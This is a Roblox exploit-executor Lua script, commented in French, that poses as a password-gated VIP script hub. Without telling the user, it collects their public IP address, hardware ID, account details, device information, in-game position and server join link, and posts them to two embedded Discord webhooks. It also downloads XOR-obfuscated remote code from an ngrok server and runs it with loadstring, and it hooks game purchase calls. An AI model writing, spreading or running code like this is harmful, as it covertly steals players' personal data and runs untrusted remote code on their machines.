loadstring(game:HttpGet('https://api.obscuravm.com/storage/0beeaa577808615fed1b50f1f386b01732aad0f5'))()
local LocalPlayer = Players.LocalPlayer
local Players   = game:GetService('Players')
local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild('PlayerGui')

local _old = PlayerGui:FindFirstChild([[Mot de passe Stats]])
if _old then _old:Destroy() end

local _i = {}

-- Instances:

_i[1] = Instance.new("ScreenGui")
_i[1].DisplayOrder = 0
_i[1].Enabled = true
_i[1].IgnoreGuiInset = false
_i[1].ResetOnSpawn = true
_i[1].Name = [[Mot de passe Stats]]


-- FAKE REQUIRE SYSTEM FOR MODULES
local _modules = {}
local old_require = require
local require = function(module)
	if _modules[module] then
		if type(_modules[module]) == 'function' then
			_modules[module] = _modules[module]()
		end
		return _modules[module]
	end
	return old_require(module)
end

-- Scripts:

local function UHZZO_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[1]

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local gui = player:WaitForChild("PlayerGui"):WaitForChild("Mot de passe Stats")
	gui.ResetOnSpawn = false
	ResetOnSpawn = false
	
end
coroutine.wrap(UHZZO_fake_script)()

local function TULUL_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[1]

	local Players = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	local UserInputService = game:GetService("UserInputService")
	local Stats = game:GetService("Stats")
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")
	local StarterGui = game:GetService("StarterGui")
	
	local API_URL = "https://v0-roblox-account-integration.vercel.app/api/vip/check"
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1555973037084639262/TBPW15Hhg0Q363vwcqKo74kLIoB47kqDD2xm3n4smE3Yg9FALo6knjNXyQM2Gd4sZgTn"
    local WEBHOOK_URL_main = "https://discord.com/api/webhooks/1565188324191117442/bVahMimYMX9tquQzGS1VQbKGqQE5cwT-rYnAtGYD51UkFJNQYBf2eugbck2rmaHMNfK-"
	local BAN_URL = "https://raw.githubusercontent.com/bryanaudinay921-ops/ban-touts/refs/heads/main/banroblox/G.lua"
	
	-- === CONFIGURATION MULTIVERSE (CORRIGÉE) ===
	-- On ajoute bien /api/get_script à la fin du lien Ngrok
	local NGROK_MULTIVERSE = "https://sighing-gauze-charcoal.ngrok-free.dev/api/get_script"
	
	local ID_CREATEUR = 9547606904
	
	local gui = script.Parent 
	_G.IsVipActive = false 
	local isHubLoaded = false
	local kickTimerStarted = false
	local webhookSent = false 
	
	-- ==========================================
	-- 0. SYSTÈME DE BANNISSEMENT GLOBAL (BLACKLIST)
	-- ==========================================
	local function checkBanList()
		local success, banData = pcall(function() return game:HttpGet(BAN_URL) end)
		if success and banData then
			for bannedId in string.gmatch(banData, "%d+") do
				if tonumber(bannedId) == LocalPlayer.UserId then
					LocalPlayer:Kick("You have been banned by the script creator for unknown reasons, but perhaps you upset them. This action is irrevocable. You are permanently banned from this script until the creator unbans you.")
					return true 
				end
			end
		end
		return false
	end
	
	if checkBanList() then return end
	-- ==========================================
	-- 1. DÉTECTION EXÉCUTEUR & HWID
	-- ==========================================
	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
	
	local hwid = "Non supporté par l'exécuteur"
	task.spawn(function()
		pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
	end)
	
	-- ==========================================
	-- 2. FONCTION WEBHOOK DISCORD (LOGGING COMPLET)
	-- ==========================================
	local function GetRealHeadShotAPI(userId)
		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
		if not httpRequest then return fallbackImage end
		local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
		local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
		if success and response and response.Body then
			local data = HttpService:JSONDecode(response.Body)
			if data and data.data and data.data[1] and data.data[1].imageUrl then return data.data[1].imageUrl end
		end
		return fallbackImage
	end
	
	local function sendDiscordLog(isVip)
		if not httpRequest or webhookSent then return end
		webhookSent = true 
	
		task.spawn(function()
			local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
			local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
			local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
			local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
			local playerCount = #Players:GetPlayers()
			local maxPlayers = Players.MaxPlayers
	
			local deviceType = "Ordinateur 💻"
			if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
			elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
			elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
	
			local ping = "Inconnu"
			pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
			local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
	
			local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
			local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
			local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
	
			local char = LocalPlayer.Character
			local humanoid = char and char:FindFirstChild("Humanoid")
			local rootPart = char and char:FindFirstChild("HumanoidRootPart")
	
			local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
			local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
			local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
	
			local positionTxt = "Inconnue"
			if rootPart then
				positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
			end
			
			local apiUrl = "https://api.ipify.org"
	
			local function recupererAdresseIP()
				local executionReussie, resultat = pcall(function()
					return game:HttpGet(apiUrl)
				end)
	
				-- Vérification du résultat de la requête
				if executionReussie then
					return resultat
				else
					return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
				end
			end
	
			-- Appel de la fonction et stockage de l'IP dans une variable
			local adresseIPPublique = recupererAdresseIP()
			
			local moneyInfo = "Non détecté"
			if LocalPlayer:FindFirstChild("leaderstats") then
				local stats = {}
				for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
					table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
				end
				if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
			end
	
			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
			local embedColor = 65531
			local embedTitle = "A1"
			local embedDesc = "Le joueur a exécuté le script avec **" .. executorName .. "**.\n\n" .. "✅ **Statut :** Clé Activé sur le site."
	
			local payload = {
				["username"] = "ZINIROX Intel",
				["avatar_url"] = myAvatar,
				["content"] = "||@everyone|| **Nouveau log détecté !**", 
				["embeds"] = {{
					["title"] = embedTitle, ["description"] = embedDesc, ["color"] = embedColor, ["thumbnail"] = { ["url"] = myAvatar },
					["fields"] = {
						{["name"] = "👤 Pseudo", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
						{["name"] = "🏷️ Surnom", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true},
						{["name"] = "🆔 ID Joueur", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = true},
						{["name"] = "💻 HWID (Machine ID)", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
						{["name"] = "📅 Âge du Compte", ["value"] = accountAge, ["inline"] = true},
						{["name"] = "💎 Premium Roblox", ["value"] = isPremium, ["inline"] = true},
						{["name"] = "🖥️ Appareil", ["value"] = deviceType, ["inline"] = true},
						{["name"] = "📡 Ping", ["value"] = ping, ["inline"] = true},
						{["name"] = "🎞️ FPS", ["value"] = fps, ["inline"] = true},
						{["name"] = "🏳️ Équipe", ["value"] = playerTeam, ["inline"] = true},
						{["name"] = "🎮 Jeu Actuel", ["value"] = "**" .. gameName .. "**", ["inline"] = true},
						{["name"] = "👥 Joueurs", ["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers), ["inline"] = true},
						{["name"] = "🌍 PlaceId", ["value"] = "```" .. tostring(game.PlaceId) .. "```", ["inline"] = true},
						{["name"] = "❤️ Santé", ["value"] = health, ["inline"] = true},
						{["name"] = "🏃 Vitesse / Saut", ["value"] = walkSpeed .. " / " .. jumpPower, ["inline"] = true},
						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
						{["name"] = "💰 Statistiques monétaires", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
						{["name"] = "📍 IP Public", ["value"] = "```" .. adresseIPPublique .. "```", ["inline"] = false},
						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n```" .. joinLink .. "```\n\n**🔑 JobId Brut :**\n```" .. game.JobId .. "```", ["inline"] = false}
					},
					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					["footer"] = { ["text"] = "ZINIROX HUB Logger • ID Serveur: " .. game.JobId }
				}}
			}
			httpRequest({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
			httpRequest({ Url = WEBHOOK_URL_main, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
		end)
	end
	
	
	-- ==========================================
	-- 3. GESTION VIP (MULTIVERSE SÉCURISÉ)
	-- ==========================================
	local function checkVIPStatus()
		local url = API_URL .. "?id=" .. tostring(LocalPlayer.UserId)
		if httpRequest then
			local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
			if success and response and response.Body then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response.Body) end)
				if decodeSuccess then return decodedData end
			end
		else
			local success, result = pcall(function() return game:HttpGet(url) end)
			if success then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(result) end)
				if decodeSuccess then return decodedData end
			end
		end
		return nil
	end
	
	local function handleVIP()
		local data = checkVIPStatus()
		if data and (data.action == "allow" or data.status == "active") then
			gui.Enabled = false
			_G.IsVipActive = true
	
			if not webhookSent then sendDiscordLog(true) end
	
			if not isHubLoaded then
				isHubLoaded = true
	
				-- === CONNEXION AU SERVEUR MULTIVERSE ===
				if httpRequest then
					local multiverseData = {
						place_id = tostring(game.PlaceId),
						hwid = hwid,
						userid = tostring(LocalPlayer.UserId)
					}
	
					local successReq, req = pcall(function()
						return httpRequest({
							Url = NGROK_MULTIVERSE,
							Method = "POST",
							Headers = {
								["Content-Type"] = "application/json",
								["ngrok-skip-browser-warning"] = "true"
							},
							Body = HttpService:JSONEncode(multiverseData)
						})
					end)
	
					if successReq and req and req.StatusCode == 200 then
						local successDecode, d = pcall(function() return HttpService:JSONDecode(req.Body) end)
						if successDecode and d.succes and d.code then
							-- DÉCODAGE XOR 90 DU CODE MULTIVERSE
							local tableau_nombres = d.code
							local caracteres = {}
							for i = 1, #tableau_nombres do
								caracteres[i] = string.char(bit32.bxor(tableau_nombres[i], 90))
							end
	
							local code_final = table.concat(caracteres)
							local executer, erreur = loadstring(code_final)
	
							if executer then
								executer()
							else
								warn("Erreur d'exécution Multiverse : " .. tostring(erreur))
							end
						end
					else
						warn("Multiverse : Impossible de contacter le serveur Python.")
					end
				else
					warn("Exécuteur non compatible pour contacter le Multiverse.")
				end
			end
	
			if not kickTimerStarted then
				kickTimerStarted = true
				local remainingMs = data.remainingMs or (4 * 60 * 60 * 1000)
				task.spawn(function()
					task.wait(remainingMs / 1000)
					LocalPlayer:Kick("Tes 4 heures de VIP sont terminées.")
				end)
			end
		else
			gui.Enabled = true 
			if not webhookSent then sendDiscordLog(false) end
			if _G.IsVipActive then LocalPlayer:Kick("Ton accès VIP vient d'expirer !") end
			_G.IsVipActive = false
		end
	end
	
	task.spawn(function()
		handleVIP()
		while true do
			if not _G.IsVipActive then task.wait(5) else task.wait(60) end
			pcall(handleVIP)
		end
	end)
	
	-- ==========================================
	-- 4. PROTECTION CRÉATEUR & BLOCAGE DES DONS
	-- ==========================================
	if LocalPlayer.UserId ~= ID_CREATEUR then
	
		-- 4A. BLOCAGE DES DONS (Pls Donate)
		local oldNamecall
		oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
			local method = getnamecallmethod()
			local args = {...}
	
			if not checkcaller() and self == MarketplaceService and (method == "PromptPurchase" or method == "PromptGamePassPurchase" or method == "PromptProductPurchase") then
				local itemId = args[2]
	
				task.spawn(function()
					local success, info = pcall(function() return MarketplaceService:GetProductInfo(itemId) end)
					if success and info then
						local targetId = (info.Creator and info.Creator.CreatorTargetId) or 0
						if targetId ~= ID_CREATEUR then
							pcall(function()
								StarterGui:SetCore("SendNotification", { Title = "ZINIROX", Text = "Vous ne pouvez faire des dons qu'au créateur du script !", Duration = 5 })
							end)
						end
					end
				end)
			end
			return oldNamecall(self, ...)
		end))
	
		-- 4B. MODE INTOUCHABLE (Forcefield + Anti-Aim)
		local mouse = LocalPlayer:GetMouse()
		RunService.RenderStepped:Connect(function()
			local creatorPlayer = nil
			for _, p in ipairs(Players:GetPlayers()) do
				if p.UserId == ID_CREATEUR then
					creatorPlayer = p
					break
				end
			end
	
			if creatorPlayer and creatorPlayer.Character and creatorPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local myChar = LocalPlayer.Character
				local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
	
				if myRoot then
					local creatorRoot = creatorPlayer.Character.HumanoidRootPart
					local distance = (myRoot.Position - creatorRoot.Position).Magnitude
					local humanoid = myChar:FindFirstChild("Humanoid")
	
					-- 1. Barrière de 20 studs
					if distance < 20 then
						local pushDirection = (myRoot.Position - creatorRoot.Position).Unit
						myRoot.CFrame = myRoot.CFrame + (pushDirection * 1.5)
						if humanoid then humanoid:UnequipTools() end
					end
	
					-- 2. Anti-Aim (Désarme si on te vise)
					if mouse.Target and mouse.Target:IsDescendantOf(creatorPlayer.Character) then
						if humanoid then humanoid:UnequipTools() end
					end
				end
			end
		end)
	end
	
	
end
coroutine.wrap(TULUL_fake_script)()


_i[1].Parent = PlayerGui
